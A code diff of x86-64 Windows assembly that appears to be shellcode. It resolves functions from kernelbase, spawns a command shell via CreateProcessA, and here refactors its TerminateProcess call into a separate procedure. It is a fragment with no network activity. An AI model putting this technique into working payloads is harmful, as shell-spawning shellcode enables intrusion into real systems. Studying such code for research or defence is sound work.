@@ -73,6 +73,15 @@ func_exit:
     ret
 lookup_func ENDP
 
+call_terminateprocess PROC
+    xor rcx, rcx
+    dec rcx                     ; Process handle
+    xor rdx, rdx                ; Zero RDX == Exit Reason
+    mov rax, [r15+88h]
+    call rax                    ; TerminateProcess
+    ret
+call_terminateprocess ENDP
+
 spawn_cmd PROC
     sub rsp, 500h
     call find_kernelbase        ; Get kernel base in RAX
@@ -129,14 +138,8 @@ call_createprocessa:
     mov [rsp + 48h], rbx        ; lpProcessInformation
     mov rax, [r15+90h]
     call rax
-
-call_terminateprocess:
-    xor rcx, rcx
-    dec rcx                     ; Process handle
-    xor rdx, rdx                ; Zero RDX == Exit Reason
-    mov rax, [r15+88h]
-    call rax                    ; TerminateProcess
-    add rsp, 500h
+    add rsp, 508h
+    ret
 
 spawn_cmd ENDP
 
